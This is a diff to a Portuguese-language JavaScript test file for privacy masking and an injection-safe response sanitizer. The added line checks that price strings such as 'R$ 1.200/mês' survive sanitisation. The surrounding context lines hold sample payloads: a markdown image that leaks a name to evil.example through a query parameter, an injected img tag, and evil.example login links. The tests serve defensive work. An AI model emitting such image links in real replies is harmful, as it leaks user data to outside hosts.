@@ -82,6 +82,7 @@ test('privacidade e injeção: telefone e e-mail mascarados no texto livre; resp
   assert.equal(mascarar('CEP 70000-000, R$ 1.250.000, 20/10/2026, IMV-123456'), 'CEP 70000-000, R$ 1.250.000, 20/10/2026, IMV-123456');
   assert.equal(respostaSegura('Oi ![x](https://evil.example/?d=Ana) e [clique](https://evil.example) <img src=x> veja https://evil.example/a'), 'Oi  e clique  veja [link removido]');
   assert.equal(respostaSegura('Abra www.evil.example/login ou evil.example/x?d=Ana ou ftp://x.y/z'), 'Abra [link removido] ou [link removido] ou [link removido]');
+  assert.equal(respostaSegura('Condomínio R$ 1.200/mês, R$ 2.500/m², R$ 1.250.000/ano, nota 4.5/5'), 'Condomínio R$ 1.200/mês, R$ 2.500/m², R$ 1.250.000/ano, nota 4.5/5', 'preço por mês ou m² fica');
   assert.deepEqual(buscarArtigos('como apago um contato?', '/', 3).some((a) => a.slug === 'conta-e-ajustes'), false, 'contato não cai em Conta');
 });
 
